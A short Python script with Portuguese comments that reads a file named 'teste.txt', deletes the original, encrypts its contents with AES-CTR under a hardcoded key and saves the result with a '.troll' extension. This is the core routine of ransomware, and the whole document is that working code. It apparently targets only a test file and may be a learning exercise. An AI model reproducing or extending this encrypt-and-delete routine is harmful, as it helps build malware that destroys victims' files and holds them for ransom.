import os
import pyaes

# abrir arquivo a ser criptografado

file_name = "teste.txt"
file = open(file_name,'rb')
file_data = file.read()
file.close()

# remover o arquivo original
os.remove(file_name) # O conteúdo é gravado na variável file_data mas o arquivo já é eliminado

# Chave de criptografia

key = b'rhaimzeeyazuezob'
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + ".troll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
